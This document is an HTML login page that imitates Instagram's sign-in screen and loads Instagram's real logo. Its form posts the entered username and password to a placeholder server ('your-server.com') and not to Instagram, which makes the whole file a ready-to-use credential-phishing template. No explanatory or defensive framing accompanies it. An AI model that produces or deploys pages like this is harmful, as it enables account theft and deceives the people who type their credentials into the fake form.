<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 150px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .form-group button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            border: none;
            color: #fff;
            border-radius: 4px;
            cursor: pointer;
        }
        .form-group button:hover {
            background-color: #0078d7;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
        </div>
        <form action="https://your-server.com/login" method="POST">
            <div class="form-group">
                <label for="username">Phone number, username, or email</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group">
                <button type="submit">Log In</button>
            </div>
        </form>
    </div>
</body>
</html>
